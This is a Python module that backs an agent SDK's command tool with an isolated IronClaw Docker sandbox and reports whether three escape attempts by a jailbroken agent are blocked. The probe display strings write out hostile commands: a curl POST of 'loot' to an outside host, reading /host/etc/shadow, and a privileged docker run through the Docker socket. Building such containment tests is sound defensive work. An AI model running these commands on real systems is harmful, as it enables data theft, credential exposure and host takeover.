"""ironclaw_sandbox — back an agent SDK's code/bash tool with a real IronClaw sandbox.

This is the shared plumbing behind the ``openai-agents`` and ``claude-agent-sdk``
integration examples. It gives an agent SDK exactly ONE dangerous capability — "run
this command" — and routes it into a real, sealed IronClaw per-session sandbox instead
of the host. The SDK still plans; the execution happens in a box with no network card,
no host filesystem, and no Docker socket.

The primitive is deliberately small and dependency-free (stdlib only, so it runs on a
stock machine with just Python + Docker):

    session = SandboxSession.engage()          # launch a real per-session sandbox
    rc, out = session.exec("uname -a")         # run a command INSIDE the box
    report  = session.containment_report()     # try three escapes, prove they fail
    session.close()

How a command actually runs inside the box
------------------------------------------
IronClaw launches one hardened container per conversation (``ic-sbx-*``), running as an
unprivileged uid (65532). We exec into that live container as its own uid — the exact
privilege a fully-jailbroken agent would have. That is the honest threat model: not
"can the model be tricked" (a different layer) but "WHEN it is, does the box hold?".

Zero credentials: the demo control-plane uses the offline ``mock`` provider, so the
whole path — engage -> sandbox -> exec -> reply — runs with no model key and no tokens.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Optional


# ANSI colour, on only for a real TTY with NO_COLOR unset (keeps CI logs clean).
def _c(code: str) -> str:
    if os.environ.get("NO_COLOR") or not sys.stdout.isatty():
        return ""
    return code


BOLD, DIM, RED, GREEN, YELLOW, CYAN, RESET = (
    _c("\033[1m"), _c("\033[2m"), _c("\033[31m"), _c("\033[32m"),
    _c("\033[33m"), _c("\033[36m"), _c("\033[0m"),
)


class SandboxError(RuntimeError):
    """Raised when the sandbox cannot be engaged or exec'd."""


@dataclass
class Probe:
    """One escape attempt and its verdict."""
    title: str          # what the attacker is trying to do
    command: str        # what they run inside the box (shown to the user)
    blocked: bool       # did the isolation boundary hold?
    detail: str         # human-readable reason

    def render(self) -> str:
        if self.blocked:
            tag = f"{GREEN}{BOLD}BLOCKED{RESET}{GREEN}"
        else:
            tag = f"{RED}{BOLD}ESCAPED{RESET}{RED}"
        return (
            f"  {BOLD}{CYAN}{self.title}{RESET}\n"
            f"  {DIM}agent runs (uid 65532, inside the box):{RESET} {YELLOW}{self.command}{RESET}\n"
            f"  {tag} - {self.detail}{RESET}\n"
        )


class SandboxSession:
    """A live IronClaw sandbox you can run commands inside of.

    Engaged by sending one chat message to the demo ``mock-agent`` group, which makes
    the router launch that conversation's per-session sandbox container.
    """

    def __init__(self, container: str, addr: str, token: str, agent: str):
        self.container = container
        self.addr = addr
        self.token = token
        self.agent = agent

    # --- lifecycle ---------------------------------------------------------
    @classmethod
    def engage(
        cls,
        addr: Optional[str] = None,
        token: Optional[str] = None,
        agent: Optional[str] = None,
        timeout: int = 180,
    ) -> "SandboxSession":
        addr = addr or os.environ.get("IRONCLAW_ADDR", "http://127.0.0.1:8787")
        token = token or os.environ.get("IRONCLAW_API_TOKEN", "ironclaw-demo")
        agent = agent or os.environ.get("IRONCLAW_DEMO_AGENT", "mock-agent")

        # A chat message makes the router launch this conversation's sandbox sibling.
        marker = f"integration-shim {os.getpid()}"
        cls._post(addr, token, "/v1/ui/chat/send",
                  {"agentGroupID": agent, "text": marker})

        deadline = time.time() + timeout
        container = ""
        while time.time() < deadline:
            # Draining the reply also nudges delivery; ignore its contents here.
            try:
                cls._get(addr, token, f"/v1/ui/chat/{agent}/messages")
            except urllib.error.URLError:
                pass
            container = cls._running_sandbox()
            if container:
                break
            time.sleep(1)
        if not container:
            raise SandboxError(
                f"no running sandbox (ic-sbx-*) appeared within {timeout}s - is the "
                f"demo control-plane up at {addr}?"
            )
        return cls(container, addr, token, agent)

    def close(self) -> None:
        # The per-session container is owned by the control-plane; nothing to do here.
        # Lifecycle (build/up/down) belongs to run.sh so the example stays composable.
        pass

    # --- the one dangerous capability, sealed ------------------------------
    def exec(self, command: str) -> tuple[int, str]:
        """Run ``command`` INSIDE the sandbox as its own uid. Returns (exit_code, output).

        This is the whole point: the SDK's bash/code tool calls this instead of running
        on the host. Everything it does is confined to the sealed box.
        """
        proc = subprocess.run(
            ["docker", "exec", "-u", "65532:65532", self.container, "sh", "-c", command],
            capture_output=True, text=True,
        )
        return proc.returncode, (proc.stdout + proc.stderr).strip()

    # --- containment probes (reused from live-containment / red-team) ------
    def containment_report(self) -> list[Probe]:
        """Run three real escape attempts inside the box and report each verdict.

        Mirrors examples/live-containment: network exfil, host-filesystem read, and
        Docker-socket takeover — the crown-jewel escapes a jailbroken agent would try.
        """
        egress_host = os.environ.get("IRONCLAW_EGRESS_PROBE_HOST", "api.anthropic.com")
        probes: list[Probe] = []

        # 1) Network exfil: network=none means only `lo` exists, so DNS has nowhere to go.
        _, ifaces = self.exec("ls -1 /sys/class/net 2>/dev/null | tr '\\n' ' ' | sed 's/ *$//'")
        dns_rc, _ = self.exec(f"getent hosts {egress_host}")
        blocked = ifaces == "lo" and dns_rc != 0
        probes.append(Probe(
            "Exfiltrate stolen data to an attacker C2",
            f"getent hosts {egress_host} && curl -X POST https://{egress_host}/loot",
            blocked,
            f"no network namespace: only `lo` exists (interfaces: [{ifaces}]) and DNS "
            f"resolution fails. network=none." if blocked
            else f"reached the network - interfaces [{ifaces}], DNS exit {dns_rc}",
        ))

        # 2) Host filesystem breakout: host root is not in the sandbox mount namespace.
        _, hostfs = self.exec(
            "if [ -e /host ] || [ -r /etc/ironclaw-host-marker ]; "
            "then echo EXPOSED; else echo CONTAINED; fi")
        blocked = hostfs == "CONTAINED"
        probes.append(Probe(
            "Read the operator's host filesystem",
            "cat /host/etc/shadow /etc/ironclaw-host-marker",
            blocked,
            "host root is outside the sandbox mount namespace: the paths do not exist "
            "in the box." if blocked
            else f"host paths are reachable from inside the sandbox ({hostfs})",
        ))

        # 3) Host takeover via the Docker socket: never mounted in, no docker client.
        _, socket = self.exec(
            "if [ -S /var/run/docker.sock ] || [ -S /run/docker.sock ]; "
            "then echo PRESENT; else echo ABSENT; fi")
        _, cli = self.exec("command -v docker >/dev/null 2>&1 && echo PRESENT || echo ABSENT")
        blocked = socket == "ABSENT" and cli == "ABSENT"
        probes.append(Probe(
            "Seize the host via the Docker Engine socket",
            "docker -H unix:///var/run/docker.sock run --privileged --pid=host ...",
            blocked,
            "the Engine socket is never mounted in and there is no docker client: "
            "nothing to seize." if blocked
            else f"the sandbox can reach the Docker Engine (socket:{socket} client:{cli})",
        ))
        return probes

    # --- small HTTP + docker helpers (stdlib only) -------------------------
    @staticmethod
    def _running_sandbox() -> str:
        proc = subprocess.run(
            ["docker", "ps",
             "--filter", "label=ironclaw.session",
             "--filter", "name=ic-sbx-",
             "--filter", "status=running",
             "--format", "{{.Names}}"],
            capture_output=True, text=True,
        )
        return proc.stdout.strip().splitlines()[0] if proc.stdout.strip() else ""

    @staticmethod
    def _post(addr: str, token: str, path: str, body: dict) -> bytes:
        req = urllib.request.Request(
            addr + path, data=json.dumps(body).encode(),
            headers={"Authorization": f"Bearer {token}",
                     "Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.read()

    @staticmethod
    def _get(addr: str, token: str, path: str) -> bytes:
        req = urllib.request.Request(
            addr + path, headers={"Authorization": f"Bearer {token}"}, method="GET")
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.read()


def print_containment(probes: list[Probe]) -> bool:
    """Pretty-print the containment table. Returns True iff every escape was blocked."""
    print()
    print("=" * 78)
    print(f" {BOLD}IronClaw containment{RESET} - the SDK's tool ran in a sealed box; "
          f"now it tries to break out")
    print("=" * 78)
    contained = sum(p.blocked for p in probes)
    for p in probes:
        print()
        print(p.render(), end="")
    print()
    print("=" * 78)
    if contained == len(probes):
        print(f" {GREEN}{BOLD}CONTAINMENT: {contained}/{len(probes)} escape attempts "
              f"DENIED. The box held.{RESET}")
        print("=" * 78)
        return True
    print(f" {RED}{BOLD}CONTAINMENT: {len(probes) - contained} of {len(probes)} escapes "
          f"SUCCEEDED - the sandbox did NOT hold.{RESET}")
    print("=" * 78)
    return False
